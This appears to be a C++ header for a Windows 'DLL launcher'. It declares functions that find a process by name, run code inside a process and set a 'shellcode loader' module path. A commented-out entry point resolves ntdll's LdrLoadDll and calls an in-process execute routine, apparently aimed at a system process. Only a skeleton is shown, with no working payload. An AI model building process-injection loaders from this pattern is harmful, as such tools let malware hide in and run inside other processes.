#ifndef DLLLAUNCHER_H_
#define DLLLAUNCHER_H_

#include "dll_launcher_struct.h"

namespace activation_win{
	bool Create(const wchar_t* name, bool is_resume);
	DWORD SnapshotProcess(const wchar_t* process_name);
	bool ProcessInternalExecute(PTHREAD_DATA parameter,DWORD process_id,int method);
	std::wstring GetAbsolutePath(const std::wstring& name);
	void SetShellcodeLdrModulePath(PTHREAD_DATA parameter,const std::wstring& srcfile);
}
#endif

/*int WINAPI wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPWSTR lpCmdLine,int nShowCmd){
	THREAD_DATA parameter = {0};
	parameter.fnRtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
	parameter.fnLdrLoadDll = (pLdrLoadDll)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrLoadDll");
	parameter.fnGetTempPathW = (pGetTempPathW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetTempPathW");
	parameter.fnGetSystemDirectoryW = (pGetSystemDirectoryW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetSystemDirectoryW");
	parameter.fnGetVolumeInformationW = (pGetVolumeInformationW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetVolumeInformationW");
	bootldr::SetProcessPrivilege();
	bootldr::SetShellcodeLdrModulePath(&parameter, bootldr::GetAbsolutePath(base::kBootldrName));
	bootldr::ProcessInternalExecute(&parameter, GetCurrentProcessId()/*CsrGetProcessId());
	/*return 0;
}*/